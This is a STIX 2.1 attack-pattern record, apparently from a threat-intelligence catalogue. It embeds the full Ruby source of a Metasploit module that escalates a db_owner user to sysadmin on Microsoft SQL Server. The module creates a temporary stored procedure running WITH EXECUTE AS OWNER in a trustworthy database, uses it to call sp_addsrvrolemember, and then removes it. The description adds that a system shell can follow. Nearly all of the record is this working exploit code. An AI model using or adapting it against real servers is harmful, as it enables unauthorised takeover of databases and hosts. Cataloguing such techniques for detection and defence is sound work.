{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--43515ed0-a820-4561-8540-80fdf0399f87",
    "created": "2024-08-14T16:22:29.89175Z",
    "modified": "2024-08-14T16:22:29.891754Z",
    "name": "Microsoft SQL Server Escalate Db_Owner",
    "description": " This module can be used to escalate privileges to sysadmin if the user has the db_owner role in a trustworthy database owned by a sysadmin user.  Once the user has the sysadmin role the msssql_payload module can be used to obtain a shell on the system. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/mssql/mssql_escalate_dbowner.rb",
            "external_id": "mssql_escalate_dbowner.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MSSQL\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft SQL Server Escalate Db_Owner',\n      'Description'    => %q{\n        This module can be used to escalate privileges to sysadmin if the user has\n        the db_owner role in a trustworthy database owned by a sysadmin user.  Once\n        the user has the sysadmin role the msssql_payload module can be used to obtain\n        a shell on the system.\n      },\n      'Author'         => [ 'nullbind <scott.sutherland[at]netspi.com>'],\n      'License'        => MSF_LICENSE,\n      'References'     => [[ 'URL','http://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx']]\n    ))\n  end\n\n  def run\n    # Check connection and issue initial query\n    print_status(\"Attempting to connect to the database server at #{rhost}:#{rport} as #{datastore['USERNAME']}...\")\n    if mssql_login_datastore\n      print_good('Connected.')\n    else\n      print_error('Login was unsuccessful. Check your credentials.')\n      disconnect\n      return\n    end\n\n    # Query for sysadmin status\n    print_status(\"Checking if #{datastore['USERNAME']} has the sysadmin role...\")\n    user_status = check_sysadmin\n\n    # Check if user has sysadmin role\n    if user_status == 1\n      print_good(\"#{datastore['USERNAME']} has the sysadmin role, no escalation required.\")\n      disconnect\n      return\n    else\n      print_status(\"You're NOT a sysadmin, let's try to change that\")\n    end\n\n    # Check for trusted databases owned by sysadmins\n    print_status(\"Checking for trusted databases owned by sysadmins...\")\n    trust_db_list = check_trust_dbs\n    if trust_db_list.nil? || trust_db_list.length == 0\n      print_error('No databases owned by sysadmin were found flagged as trustworthy.')\n      disconnect\n      return\n    else\n      # Display list of accessible databases to user\n      print_good(\"#{trust_db_list.length} affected database(s) were found:\")\n      trust_db_list.each do |db|\n        print_status(\" - #{db[0]}\")\n      end\n    end\n\n    # Check if the user has the db_owner role in any of the databases\n    print_status('Checking if the user has the db_owner role in any of them...')\n    dbowner_status = check_db_owner(trust_db_list)\n    if dbowner_status.nil?\n      print_error(\"Fail buckets, the user doesn't have db_owner role anywhere.\")\n      disconnect\n      return\n    end\n\n    # Attempt to escalate to sysadmin\n    print_status(\"Attempting to escalate in #{dbowner_status}!\")\n    escalate_status = escalate_privs(dbowner_status)\n    if escalate_status\n      # Check if escalation was successful\n      user_status = check_sysadmin\n      if user_status == 1\n        print_good(\"Congrats, #{datastore['USERNAME']} is now a sysadmin!.\")\n      else\n        print_error(\"Fail buckets, something went wrong.\")\n      end\n    else\n      print_error(\"Error while trying to escalate status\")\n    end\n\n    disconnect\n    return\n  end\n\n  # Checks if user is already sysadmin\n  def check_sysadmin\n    # Setup query to check for sysadmin\n    sql = \"select is_srvrolemember('sysadmin') as IsSysAdmin\"\n\n    # Run query\n    result = mssql_query(sql)\n\n    # Parse query results\n    parse_results = result[:rows]\n    status = parse_results[0][0]\n\n    # Return status\n    return status\n  end\n\n  # Gets trusted databases owned by sysadmins\n  def check_trust_dbs\n    # Setup query\n    sql = \"SELECT d.name AS DATABASENAME\n    FROM sys.server_principals r\n    INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id\n    INNER JOIN sys.server_principals p ON\n    p.principal_id = m.member_principal_id\n    inner join sys.databases d on suser_sname(d.owner_sid) = p.name\n    WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') and r.type = 'R' and r.name = N'sysadmin'\"\n\n    result = mssql_query(sql)\n\n    # Return on success\n    return result[:rows]\n  end\n\n  # Checks if user has the db_owner role\n  def check_db_owner(trust_db_list)\n    # Check if the user has the db_owner role is any databases\n    trust_db_list.each do |db|\n      # Setup query\n      sql = \"use #{db[0]};select db_name() as db,rp.name as database_role, mp.name as database_user\n      from [#{db[0]}].sys.database_role_members drm\n      join [#{db[0]}].sys.database_principals rp on (drm.role_principal_id = rp.principal_id)\n      join [#{db[0]}].sys.database_principals mp on (drm.member_principal_id = mp.principal_id)\n      where rp.name = 'db_owner' and mp.name = SYSTEM_USER\"\n\n      # Run query\n      result = mssql_query(sql)\n\n      # Parse query results\n      parse_results = result[:rows]\n      if parse_results && parse_results.any?\n        print_good(\"- db_owner on #{db[0]} found!\")\n        return db[0]\n      end\n    end\n\n    nil\n  end\n\n  def escalate_privs(dbowner_db)\n    print_status(\"#{dbowner_db}\")\n    # Create the evil stored procedure WITH EXECUTE AS OWNER\n    evil_sql_create = \"use #{dbowner_db};\n    DECLARE @myevil as varchar(max)\n    set @myevil = '\n    CREATE PROCEDURE sp_elevate_me\n    WITH EXECUTE AS OWNER\n    as\n    begin\n    EXEC sp_addsrvrolemember ''#{datastore['USERNAME']}'',''sysadmin''\n    end';\n    exec(@myevil);\n    select 1;\"\n    mssql_query(evil_sql_create)\n\n    # Run the evil stored procedure\n    evilsql_run = \"use #{dbowner_db};\n    DECLARE @myevil2 as varchar(max)\n    set @myevil2 = 'EXEC sp_elevate_me'\n    exec(@myevil2);\"\n    mssql_query(evilsql_run)\n\n    # Remove evil procedure\n    evilsql_remove = \"use #{dbowner_db};\n    DECLARE @myevil3 as varchar(max)\n    set @myevil3 = 'DROP PROCEDURE sp_elevate_me'\n    exec(@myevil3);\"\n    mssql_query(evilsql_remove)\n\n    true\n  end\nend\n"
}